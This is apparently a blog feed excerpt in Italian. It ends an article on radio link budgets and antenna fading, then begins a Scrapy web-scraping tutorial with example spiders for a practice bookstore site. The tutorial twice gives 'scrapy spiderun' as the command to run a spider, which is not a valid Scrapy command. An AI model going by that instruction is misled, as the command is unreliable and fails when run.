&lt;p&gt;Se si opera a frequenze elevate, si dovrebbe verificare che l’altezza sia sufficiente per fornire la visibilitá radio fra le antenne.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Stimiamo l’attenuazione supplementare ( \(A_{suppl}\) ); indicativamente in ambiente aperto e in situazioni meteo favorevoli l’attenuazione supplementare é trascurabile per frequenze inferiori ai \(10  GHz\), \(0,02  dB/km\) a circa \(0,2  dB/km\) fino a \(40 GHz\).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Si introduce un &lt;em&gt;margine del collegamento&lt;/em&gt;, o margine di link (\(M_L\)) per tener conto dell’aumento di attenuazione che si potrebbe avere in determinate condizioni atmosferiche. \(M_L\) é legato alla frequenza di trasmissione e alla disponibilitá che si desidera ottenere per il collegamento.&lt;/p&gt;
&lt;p&gt;Nei collegamenti terrestri si puó aggiungere nel margine di link anche un margine contro i fading (margine di fading, \(M_F\)).&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Determiniamo il livello di potenza in ingresso al ricevitore.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Noto il tipo di antenna ricevente e le sue caratteristiche se ne determinina il guadagno (\(G_g\), in dBi, o dB per le antenne paraboliche).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Si calcola l’attenuazione del feeder in ricezione.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Si calcola il livello di potenza in ingresso al ricevitore:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}L_{PRX} = EIRP - [A_{SL} + A_{suppl} + M_L] + G_R - A_{FRX} dBm
$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Si verifica che il livello in ricezione sia almeno pari alla sensibilitá del ricevitore affinché il sistema fornisca in uscita un segnale con livello e qualitá accettabile:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}L_{PRX_[dBm] } \geq S_{RX_[dBm]}
$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Utilizzando la stessa metedologia é possibile, variando i dati, determinare un’incognita diversa:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Distanza massima del collegamento&lt;/li&gt;
&lt;li&gt;Guadagno che deve avere l’antenna ricevente&lt;/li&gt;
&lt;li&gt;Margine di link che si ha&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;fading-delle-antenne&#34;&gt;Fading delle Antenne&lt;/h1&gt;
&lt;p&gt;Il fenomeno del fading delle antenne si riferisce alla perdita di intensità del segnale radio quando viene trasmesso da un&amp;rsquo;antenna e ricevuto da un&amp;rsquo;altra. Questo può accadere a causa di diverse ragioni, tra cui l&amp;rsquo;effetto della riflessione, la diffrazione e l&amp;rsquo;assorbimento delle onde radio.&lt;/p&gt;
&lt;p&gt;In particolare, il fading può essere causato dalla riflessione delle onde radio su superfici come edifici, alberi o montagne, che possono creare zone di attenuazione o interferenza nel segnale radio. Inoltre, il fading può essere causato dalla diffrazione, cioè dalla deviazione del segnale radio quando incontra ostacoli come angoli, spigoli o superfici curve.&lt;/p&gt;
&lt;p&gt;Il fading può anche essere causato dall&amp;rsquo;assorbimento delle onde radio da parte di materiali come acqua, pioggia, neve o aria umida. In questo caso, la quantità di energia del segnale radio diminuisce man mano che attraversa questi materiali, causando un attenuamento del segnale.&lt;/p&gt;
&lt;p&gt;Il fading può essere ridotto utilizzando tecniche come l&amp;rsquo;uso di antenne direzionali, la diversità di antenna e la modulazione adattiva, che possono aiutare a migliorare la qualità del segnale radio e ridurre la perdita di intensità.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Basi sul Modulo Scrapy</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/</guid>
      <description>Table Of Contents:
 Introduzione al modulo Esempi Pratici  Estrazione del titolo di una pagina web Estrazione dei prezzi dei libri da una pagina web Estrazione di tutte le informazioni sui libri da una pagina web Estrazione di tutte le informazioni sui libri da più pagine web Estrazione di informazioni sui libri da una pagina web utilizzando un&amp;rsquo;espressione regolare Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV Scraping di dati da più siti Scraping di dati da una pagina con autenticazione Scraping di dati da una pagina AJAX Scraping di dati da una pagina utilizzando una sessione Scraping di tutti i prezzi dei libri su tutte le pagine Scraping di tutti i titoli e le categorie dei libri Scraping delle immagini dei libri Scraping dei prezzi dei libri in un formato specifico (es.</description>
      <content>
  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/Scrapy-Banner.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#introduzione-al-modulo&#34;&gt;Introduzione al modulo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#esempi-pratici&#34;&gt;Esempi Pratici&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-del-titolo-di-una-pagina-web&#34;&gt;Estrazione del titolo di una pagina web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-dei-prezzi-dei-libri-da-una-pagina-web&#34;&gt;Estrazione dei prezzi dei libri da una pagina web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-di-tutte-le-informazioni-sui-libri-da-una-pagina-web&#34;&gt;Estrazione di tutte le informazioni sui libri da una pagina web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-di-tutte-le-informazioni-sui-libri-da-pi--pagine-web&#34;&gt;Estrazione di tutte le informazioni sui libri da più pagine web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-di-informazioni-sui-libri-da-una-pagina-web-utilizzando-un-espressione-regolare&#34;&gt;Estrazione di informazioni sui libri da una pagina web utilizzando un&amp;rsquo;espressione regolare&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#estrazione-di-informazioni-sui-libri-da-una-pagina-web-e-salvataggio-in-formato-csv&#34;&gt;Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-dati-da-pi--siti&#34;&gt;Scraping di dati da più siti&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-dati-da-una-pagina-con-autenticazione&#34;&gt;Scraping di dati da una pagina con autenticazione&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-dati-da-una-pagina-ajax&#34;&gt;Scraping di dati da una pagina AJAX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-dati-da-una-pagina-utilizzando-una-sessione&#34;&gt;Scraping di dati da una pagina utilizzando una sessione&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-tutti-i-prezzi-dei-libri-su-tutte-le-pagine&#34;&gt;Scraping di tutti i prezzi dei libri su tutte le pagine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-di-tutti-i-titoli-e-le-categorie-dei-libri&#34;&gt;Scraping di tutti i titoli e le categorie dei libri&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-delle-immagini-dei-libri&#34;&gt;Scraping delle immagini dei libri&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scraping-dei-prezzi-dei-libri-in-un-formato-specifico--es-json-&#34;&gt;Scraping dei prezzi dei libri in un formato specifico (es. JSON)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;introduzione-al-modulo&#34;&gt;Introduzione al modulo&lt;/h1&gt;
&lt;p&gt;Scrapy è un modulo Python open-source per il web scraping. È stato progettato per estrarre i dati da siti web in modo efficiente e rapido. Scrapy offre una serie di funzionalità avanzate per il web scraping, tra cui la gestione delle richieste, la navigazione del sito, la selezione dei dati tramite XPath o CSS selector e la gestione dei cookie.&lt;/p&gt;
&lt;p&gt;Il modulo Scrapy utilizza una struttura ad albero per rappresentare il contenuto di una pagina web. Ciò consente agli sviluppatori di selezionare facilmente i dati desiderati utilizzando i selettori CSS e XPath. Inoltre, Scrapy fornisce una serie di metodi per navigare il sito web come segue: seguire i link, inviare form e gestire i cookie.&lt;/p&gt;
&lt;p&gt;Scrapy è anche progettato per essere utilizzato in modo scalabile, è in grado di gestire grandi quantità di dati e di supportare il parallelismo. Il modulo supporta anche la persistenza dei dati, consentendo di salvare i dati estratti in un formato specifico, come CSV, JSON o XML.&lt;/p&gt;
&lt;p&gt;Per creare un progetto con Scrapy, è necessario creare un nuovo progetto utilizzando il comando scrapy startproject, quindi creare un nuovo spider utilizzando il comando scrapy genspider. In seguito si definiscono le regole di scraping nella funzione parse() del proprio spider.&lt;/p&gt;
&lt;p&gt;In sintesi Scrapy è uno strumento molto potente per estrarre i dati dal web, grazie alla sua flessibilità e alle sue funzionalità avanzate, è possibile creare spider in grado di estrarre dati da siti web complessi e navigare attraverso più pagine.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Il web scraping è una pratica legale a meno che non violi le condizioni d&amp;rsquo;uso del sito web in questione. Il presente software è stato creato per scopi educativi e di ricerca e non deve essere utilizzato per violare le leggi o i termini d&amp;rsquo;uso di un sito web. L&amp;rsquo;utente è responsabile dell&amp;rsquo;utilizzo del software e degli eventuali danni causati dall&amp;rsquo;utilizzo improprio. ⚠️&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Per installare e configurare uno progetto con il modulo scrapy possiamo usare i seguenti step:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Installare Scrapy&lt;/strong&gt;: è possibile farlo utilizzando il comando seguente nella riga di comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip install scrapy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Oppure per Python3:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install scrapy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Creare un nuovo progetto&lt;/strong&gt;: Per creare un progetto è possibile utilizzare il comando nella riga di comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy startproject &amp;lt;nome_progetto&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dove &lt;em&gt;&amp;lt;nome_progetto&amp;gt;&lt;/em&gt; è il nome del progetto che si desidera creare. Questo comando creerà una nuova cartella con il nome del progetto, che conterrà i file di configurazione e la struttura del progetto.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Creare un nuovo spider&lt;/strong&gt;: utilizzare il comando seguente nella riga di comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy genspider &amp;lt;nome_spider&amp;gt; &amp;lt;dominio&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dove &lt;em&gt;&amp;lt;nome_spider&amp;gt;&lt;/em&gt; è il nome del spider che si desidera creare e &lt;em&gt;&lt;dominio&gt;&lt;/em&gt; è il dominio del sito web da cui si desidera estrarre i dati. Questo comando creerà un nuovo file spider nella cartella &amp;ldquo;spiders&amp;rdquo; del progetto. Il comando richiede il nome dello spider e l&amp;rsquo;URL di partenza per lo spider. Esempio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy genspider example example.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo creerà un file chiamato example.py all&amp;rsquo;interno della cartella &lt;em&gt;spiders&lt;/em&gt; del tuo progetto, con una classe di spider chiamata &lt;em&gt;ExampleSpider&lt;/em&gt; che inizia a estrarre i dati dall&amp;rsquo;URL example.com.&lt;/p&gt;
&lt;p&gt;Una volta creato lo spider, è possibile modificare il codice per soddisfare le esigenze del progetto. In seguito, lo spider può essere eseguito utilizzando il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy spiderun &amp;lt;nome_spider&amp;gt;.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Extra&lt;/strong&gt;: ExampleSpider è il nome della classe dello spider generato automaticamente dal comando &lt;em&gt;scrapy genspider&lt;/em&gt; con il nome che gli hai dato quando hai creato lo spider.&lt;/p&gt;
&lt;p&gt;La classe estende la classe base scrapy.Spider e include una serie di proprietà e metodi predefiniti che puoi utilizzare per configurare e eseguire lo spider.&lt;/p&gt;
&lt;p&gt;Per esempio, nella classe è presente il nome dello spider name e gli url di partenza start_urls che specificano l&amp;rsquo;indirizzo web a cui si vuole fare scraping, la funzione di callback parse() che viene chiamata quando lo spider recupera una pagina web.&lt;/p&gt;
&lt;p&gt;L&amp;rsquo;idea è che tu possa modificare questa classe e adattarlo alle tue esigenze specifiche, aggiungendo eventuali selettori CSS o XPath, gestione dei cookies, trattamento dei dati, ecc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Modificare il codice del spider&lt;/strong&gt;: aprire il file spider appena creato e modificare il codice per adattarlo alle esigenze del progetto. È possibile utilizzare il metodo start_requests() per specificare la URL iniziale da cui iniziare a estrarre i dati, il metodo parse() per specificare come estrarre i dati dalle pagine web, e il metodo parse_item() per specificare come estrarre i dati da un singolo elemento della pagina web.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Eseguire lo spider&lt;/strong&gt;: Come citato in precedenza è possibile utilizzare il comando seguente nella riga di comando per eseguire lo spider:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy spiderun &amp;lt;nome_spider&amp;gt;.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dove &lt;em&gt;&amp;lt;nome_spider&amp;gt;&lt;/em&gt; è il nome del spider creato in precedenza. In questo modo, verranno stampati i dati estratti nella console o salvati in un file, a seconda delle impostazioni specificate nel codice. Per eseguire lo spider bisogna trovarsi nella directory &lt;em&gt;spiders&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ricordati che è possibile utilizzare anche il comando&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scrapy shell &amp;lt;url&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo per testare il codice del tuo spider su una singola pagina web, prima di lanciare la scansione sull&amp;rsquo;intero sito.&lt;/p&gt;
&lt;p&gt;Di seguito vediamo degli esempi usando come URL: &lt;a href=&#34;http://books.toscrape.com/&#34;&gt;http://books.toscrape.com/&lt;/a&gt; che viene usato appositamente per il Web Scraping.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Nota:&lt;/strong&gt;&lt;/em&gt; durante l’esecuzione del codice possono esserci errori per la mancanza del modulo attrs, per installarlo usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip install attrs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Oppure per Python3:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install attrs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Se abbiamo già questo modulo, possiamo aggiornarlo con il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip install --upgrade attrs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;esempi-pratici&#34;&gt;Esempi Pratici&lt;/h1&gt;
&lt;h2 id=&#34;estrazione-del-titolo-di-una-pagina-web&#34;&gt;Estrazione del titolo di una pagina web&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TitleSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;titlespider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice crea uno spider chiamato &lt;strong&gt;TitleSpider&lt;/strong&gt; che estende la classe base &lt;strong&gt;scrapy.Spider&lt;/strong&gt;. Nella classe, viene definito un nome per lo spider e una lista di URL di partenza per lo spider. Nel nostro caso, l&amp;rsquo;URL di partenza è una pagina web di un negozio di libri online.&lt;/p&gt;
&lt;p&gt;La funzione parse() è chiamata ogni volta che lo spider recupera una pagina web. All&amp;rsquo;interno della funzione parse(), utilizziamo un ciclo for per scorrere tutti gli elementi HTML che corrispondono al selettore &lt;strong&gt;article.product_pod&lt;/strong&gt;. Questo selettore seleziona tutti gli elementi  &lt;em&gt;&amp;lt; article &amp;gt;&lt;/em&gt; con la classe &lt;strong&gt;product_pod&lt;/strong&gt; nella pagina web.&lt;/p&gt;
&lt;p&gt;Per ogni elemento selezionato, utilizziamo il selettore &lt;em&gt;h3 &amp;gt; a::text&lt;/em&gt; per selezionare il testo del primo elemento &lt;em&gt;&amp;lt; a &amp;gt;&lt;/em&gt; all&amp;rsquo;interno dell&amp;rsquo;elemento &lt;em&gt;&amp;lt; h3 &amp;gt;&lt;/em&gt; all&amp;rsquo;interno dell&amp;rsquo;elemento &lt;em&gt;&amp;lt; article &amp;gt;&lt;/em&gt;. Il testo selezionato rappresenta il titolo del libro. Utilizziamo la funzione get() per restituire il valore del titolo del libro come una stringa. Infine, utilizziamo yield per restituire un dizionario contenente il titolo del libro. Alla fine del ciclo for, lo spider avrà raccolto tutti i titoli dei libri presenti nella pagina web di partenza.&lt;/p&gt;
&lt;h2 id=&#34;estrazione-dei-prezzi-dei-libri-da-una-pagina-web&#34;&gt;Estrazione dei prezzi dei libri da una pagina web&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PriceSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pricespider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice è un esempio di uno spider di Scrapy che estrae i prezzi dei libri da una pagina web specifica.&lt;/p&gt;
&lt;p&gt;La classe PriceSpider estende la classe base scrapy.Spider e include alcune proprietà e metodi specifici per questo spider.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La proprietà name assegna un nome allo spider, in questo caso &amp;ldquo;pricespider”&lt;/li&gt;
&lt;li&gt;La proprietà start_urls specifica gli URL di partenza per lo spider, in questo caso l&amp;rsquo;indirizzo &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&lt;/a&gt;&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La funzione parse() è il metodo di callback chiamato quando lo spider recupera una pagina web, questa funzione è responsabile di estrarre i dati dalla pagina.&lt;/p&gt;
&lt;p&gt;La funzione utilizza un ciclo for per ciclare attraverso ogni elemento HTML con classe &lt;em&gt;article.product_pod&lt;/em&gt;, questi elementi rappresentano ogni libro presente sulla pagina.&lt;/p&gt;
&lt;p&gt;Per ogni libro, utilizza il selettore CSS &lt;em&gt;.price_color&lt;/em&gt; per individuare il prezzo del libro, e utilizza il metodo get() per recuperare il testo del prezzo. Il prezzo estratto viene quindi aggiunto ad un dizionario come valore della chiave &amp;ldquo;price&amp;rdquo; e restituito attraverso l&amp;rsquo;istruzione yield.&lt;/p&gt;
&lt;p&gt;In sintesi, questo spider recupera la pagina web specificata, estrae i prezzi di ogni libro presente sulla pagina e li restituisce come una serie di dizionari, dove ogni dizionario rappresenta un libro e contiene solo una chiave &lt;em&gt;price&lt;/em&gt; con il relativo prezzo del libro.&lt;/p&gt;
&lt;h2 id=&#34;estrazione-di-tutte-le-informazioni-sui-libri-da-una-pagina-web&#34;&gt;Estrazione di tutte le informazioni sui libri da una pagina web&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
